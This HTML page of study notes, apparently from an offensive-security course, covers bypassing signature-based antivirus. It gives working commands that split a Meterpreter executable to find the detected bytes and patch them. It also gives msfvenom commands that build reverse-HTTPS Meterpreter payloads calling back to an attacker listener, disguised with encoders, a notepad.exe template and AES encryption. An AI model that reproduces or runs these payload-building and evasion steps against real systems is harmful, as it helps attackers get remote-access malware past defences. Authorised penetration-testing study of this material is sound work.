<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Bypass signature based (theory)</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>Bypass signature based (theory)</h1><br/><p><ul><li><small>we need to identify bytes that are trigerring detection</small></li><li><small>approach : split exe insto small pieced and scan on each piece until we have a hit </small></li></ul></p><p><h2>Practical</h2></p><p></p><p><div class="codebox"><pre><span style="color:#0088ff;font-weight:400"># split file</span><br /> <span style="color:#ff9d00;font-weight:700">Import-Module</span> .<span style="color:#ff9d00;font-weight:700">\</span><span style="color:#00117f;font-weight:400">Find-AVSignature</span>.ps1<br /> <span style="color:#00117f;font-weight:400">Find-AVSignature</span> <span style="color:#ff9d00;font-weight:700">-</span>StartByte <span style="color:#333333;font-weight:400">0</span> <span style="color:#ff9d00;font-weight:700">-</span>EndByte max <span style="color:#ff9d00;font-weight:700">-</span>Interval <span style="color:#333333;font-weight:400">10000</span> <span style="color:#ff9d00;font-weight:700">-</span>Path<br />C<span style="color:#ff9d00;font-weight:700">:\</span>Tools<span style="color:#ff9d00;font-weight:700">\</span>met.exe <span style="color:#ff9d00;font-weight:700">-</span>OutPath C<span style="color:#ff9d00;font-weight:700">:\</span>Tools<span style="color:#ff9d00;font-weight:700">\</span>avtest1 <span style="color:#333333;font-weight:400">-Verbose</span> <span style="color:#ff9d00;font-weight:700">-</span>Force<br /><br /><span style="color:#0088ff;font-weight:400"># scan each piece </span><br />.<span style="color:#ff9d00;font-weight:700">\</span>clamscan.exe C<span style="color:#ff9d00;font-weight:700">:\</span>Tools<span style="color:#ff9d00;font-weight:700">\</span>avtest1<br /><br /><span style="color:#0088ff;font-weight:400">## To investigate further, we’ll run Find-AVSignature again to split the Meterpreter executable with 1000 byte intervals, but only from offset 10000 to 20000.</span><br /><span style="color:#00117f;font-weight:400">Find-AVSignature</span> <span style="color:#ff9d00;font-weight:700">-</span>StartByte <span style="color:#333333;font-weight:400">10000</span> <span style="color:#ff9d00;font-weight:700">-</span>EndByte <span style="color:#333333;font-weight:400">20000</span> <span style="color:#ff9d00;font-weight:700">-</span>Interval <span style="color:#333333;font-weight:400">1000</span> <span style="color:#ff9d00;font-weight:700">-</span>Path C<span style="color:#ff9d00;font-weight:700">:\</span>Tools<span style="color:#ff9d00;font-weight:700">\</span>met.exe <span style="color:#ff9d00;font-weight:700">-</span>OutPath C<span style="color:#ff9d00;font-weight:700">:\</span>Tools<span style="color:#ff9d00;font-weight:700">\</span>avtest2 <span style="color:#333333;font-weight:400">-Verbose</span> <span style="color:#ff9d00;font-weight:700">-</span>Force<br /><span style="color:#0088ff;font-weight:400"># we continue until 1 byte detection then we change this byte</span><br /><br /><span style="color:#0088ff;font-weight:400">$bytes</span> <span style="color:#ff9d00;font-weight:700">=</span> [System.IO.File]<span style="color:#ff9d00;font-weight:700">::</span>ReadAllBytes(<span style="color:#3ad900;font-weight:400">&quot;C:\Tools\met.exe&quot;</span>)<br /><span style="color:#0088ff;font-weight:400">$bytes</span>[<span style="color:#333333;font-weight:400">18867</span>] <span style="color:#ff9d00;font-weight:700">=</span> <span style="color:#333333;font-weight:400">0</span><br /><span style="color:#0088ff;font-weight:400">$bytes</span>[<span style="color:#333333;font-weight:400">18987</span>] <span style="color:#ff9d00;font-weight:700">=</span> <span style="color:#333333;font-weight:400">0</span><br /><span style="color:#0088ff;font-weight:400">$bytes</span>[<span style="color:#333333;font-weight:400">73801</span>] <span style="color:#ff9d00;font-weight:700">=</span> <span style="color:#333333;font-weight:400">0xFF</span><br />[System.IO.File]<span style="color:#ff9d00;font-weight:700">::</span>WriteAllBytes(<span style="color:#3ad900;font-weight:400">&quot;C:\Tools\met_mod.exe&quot;</span>, <span style="color:#0088ff;font-weight:400">$bytes</span>)<br /><br /><span style="color:#0088ff;font-weight:400">## problem : we have destroyed functionaility of the executable     </span></pre></div></p><p></p><p><h2>Bypass with metasploit: encoders (only applied for claimAv)</h2><ul><li>• <small>• encoders nowadyas are usefull for bytes replecement</small></li><li><small>msfvenom --list-encoders</small><ul><li><small>x86/shikata_ga_nai </small></li><li><small>polymorphic encoder that outputs a different output each time </small></p><p></li></ul></li></ul><div class="codebox"><pre>sudo msfvenom <span style="color:#ff9d00;font-weight:700">-</span>p windows<span style="color:#ff9d00;font-weight:700">/</span>x64<span style="color:#ff9d00;font-weight:700">/</span>meterpreter<span style="color:#ff9d00;font-weight:700">/</span>reverse_https LHOST<span style="color:#ff9d00;font-weight:700">=</span><span style="color:#333333;font-weight:400">192.168</span>.<span style="color:#333333;font-weight:400">119.120</span> LPORT<span style="color:#ff9d00;font-weight:700">=</span><span style="color:#333333;font-weight:400">443</span> <span style="color:#ff9d00;font-weight:700">-</span>f exe <span style="color:#ff9d00;font-weight:700">-</span>o <span style="color:#ff9d00;font-weight:700">/</span>var<span style="color:#ff9d00;font-weight:700">/</span>www<span style="color:#ff9d00;font-weight:700">/</span>html<span style="color:#ff9d00;font-weight:700">/</span>met64.exe<br /><span style="color:#0088ff;font-weight:400">## x64 is more rare and thus more susceptoible to bypass AV </span><br /><br /><span style="color:#0088ff;font-weight:400"># msfvenom uses a static template for its executables and it can be detected buy AV we can change ot via -x </span><br />sudo msfvenom <span style="color:#ff9d00;font-weight:700">-</span>p windows<span style="color:#ff9d00;font-weight:700">/</span>x64<span style="color:#ff9d00;font-weight:700">/</span>meterpreter<span style="color:#ff9d00;font-weight:700">/</span>reverse_https LHOST<span style="color:#ff9d00;font-weight:700">=</span><span style="color:#333333;font-weight:400">192.168</span>.<span style="color:#333333;font-weight:400">176.134</span> LPORT<span style="color:#ff9d00;font-weight:700">=</span><span style="color:#333333;font-weight:400">443</span> <span style="color:#ff9d00;font-weight:700">-</span>e x64<span style="color:#ff9d00;font-weight:700">/</span>zutto_dekiru <span style="color:#ff9d00;font-weight:700">-</span>x <span style="color:#ff9d00;font-weight:700">/</span>home<span style="color:#ff9d00;font-weight:700">/</span>kali<span style="color:#ff9d00;font-weight:700">/</span>notepad.exe <span style="color:#ff9d00;font-weight:700">-</span>f exe <span style="color:#ff9d00;font-weight:700">-</span>o <span style="color:#ff9d00;font-weight:700">/</span>var<span style="color:#ff9d00;font-weight:700">/</span>www<span style="color:#ff9d00;font-weight:700">/</span>html<span style="color:#ff9d00;font-weight:700">/</span>met64_notepad.exe</pre></div></p><p></p><p><h2>Bypass with metasploit: encrypters</h2></p><p></p><p><div class="codebox"><pre>msfvenom <span style="color:#ff9d00;font-weight:700">--</span>list encrypt<br />sudo msfvenom <span style="color:#ff9d00;font-weight:700">-</span>p windows<span style="color:#ff9d00;font-weight:700">/</span>x64<span style="color:#ff9d00;font-weight:700">/</span>meterpreter<span style="color:#ff9d00;font-weight:700">/</span>reverse_https LHOST<span style="color:#ff9d00;font-weight:700">=</span><span style="color:#333333;font-weight:400">192.168</span>.<span style="color:#333333;font-weight:400">119.120</span> LPORT<span style="color:#ff9d00;font-weight:700">=</span><span style="color:#333333;font-weight:400">443</span> <span style="color:#ff9d00;font-weight:700">--</span>encrypt aes256 <span style="color:#ff9d00;font-weight:700">--</span><span style="color:#00117f;font-weight:400">encrypt-key</span> fdgdgj93jf43uj983uf498f43 <span style="color:#ff9d00;font-weight:700">-</span>f exe <span style="color:#ff9d00;font-weight:700">-</span>o <span style="color:#ff9d00;font-weight:700">/</span>var<span style="color:#ff9d00;font-weight:700">/</span>www<span style="color:#ff9d00;font-weight:700">/</span>html<span style="color:#ff9d00;font-weight:700">/</span>met64_aes.exe<br /><br /><span style="color:#0088ff;font-weight:400">## Unfortunately, our executable is still flagged. A Rapid7 blog post291 suggests this feature is effective for antivirus evasion, but the decryption routine itself can still be detected since it is static.</span></pre></div></p><p></p></div>
</body>
</html>
